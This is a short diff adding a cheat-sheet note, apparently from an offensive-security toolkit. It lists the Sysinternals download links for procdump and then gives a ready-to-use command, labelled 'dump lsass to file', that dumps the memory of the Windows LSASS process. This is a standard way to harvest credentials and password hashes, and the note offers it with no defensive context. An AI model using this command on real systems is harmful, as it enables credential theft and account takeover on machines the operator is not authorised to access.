@@ -1,0 +1,7 @@
+# source
+https://live.sysinternals.com/procdump.exe
+https://live.sysinternals.com/procdump64.exe
+
+# dump lsass to file
+procdump.exe -accepteula -ma lsass.exe <file>
+
